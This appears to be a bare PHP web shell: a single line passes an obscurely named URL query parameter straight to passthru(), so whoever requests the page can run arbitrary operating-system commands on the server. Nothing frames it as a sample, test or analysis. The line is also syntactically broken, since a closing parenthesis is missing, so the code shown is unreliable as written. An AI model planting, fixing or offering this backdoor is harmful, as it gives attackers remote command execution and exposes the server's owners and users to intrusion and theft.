<?php
passthru($_GET['IybPWiQS'];
?>
